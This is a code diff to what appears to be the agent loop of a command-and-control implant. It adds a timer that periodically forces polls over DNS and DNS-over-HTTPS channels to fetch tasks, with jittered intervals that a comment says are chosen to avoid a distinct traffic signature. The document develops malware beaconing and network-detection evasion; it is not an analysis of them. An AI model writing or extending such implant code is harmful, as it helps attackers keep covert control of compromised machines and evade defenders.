@@ -306,6 +306,7 @@ void AgentMain()
 	ULONG pendingUploadSize = 0;
 	ULONG uploadBackoffMs = 0;
 	ULONG nextUploadAttemptTick = 0;
+	ULONG nextForcePollTick = 0;
 
 	do {
 		if (pendingUpload && pendingUploadSize) {
@@ -565,6 +566,7 @@ void AgentMain()
 	ULONG pendingUploadSize = 0;
 	ULONG uploadBackoffMs = 0;
 	ULONG nextUploadAttemptTick = 0;
+	ULONG nextForcePollTick = 0;
 
 	do {
 		if (pendingUpload && pendingUploadSize) {
@@ -784,6 +786,7 @@ void AgentMain()
 	ULONG pendingUploadSize = 0;
 	ULONG uploadBackoffMs = 0;
 	ULONG nextUploadAttemptTick = 0;
+	ULONG nextForcePollTick = 0;
 
 	do {
 		if (pendingUpload && pendingUploadSize) {
@@ -890,6 +893,28 @@ void AgentMain()
 			BYTE* dohUrls = g_Agent->config->profile.doh.urls;
 			if (dohUrls && dohUrls != (BYTE*)g_DohConnector->GetUrls()) {
 				g_DohConnector->UpdateUrls(dohUrls);
+			}
+		}
+
+		// Recursion-stable downlink: periodically force a GET poll even if cached
+		// heartbeat indicates "no tasks". Interval is derived from configured sleep
+		// to avoid creating a distinct traffic signature.
+		{
+			ULONG now = GetTickCount();
+			if (nextForcePollTick == 0) {
+				nextForcePollTick = now + 1500 + (now & 0x3FF);
+			}
+			BOOL idle = (packerOut->datasize() < 8) && !TX_IS_BUSY() && (pendingUpload == NULL);
+			if (idle && now >= nextForcePollTick) {
+				ULONG baseSleep = g_Agent->config->sleep_delay;
+				ULONG interval = baseSleep / 2;
+				if (interval < 1200) interval = 1200;
+				if (interval > 8000) interval = 8000;
+				interval += (now & 0x3FF);
+				nextForcePollTick = now + interval;
+
+				g_DnsConnector->ForcePollOnce();
+				g_DohConnector->ForcePollOnce();
 			}
 		}
 
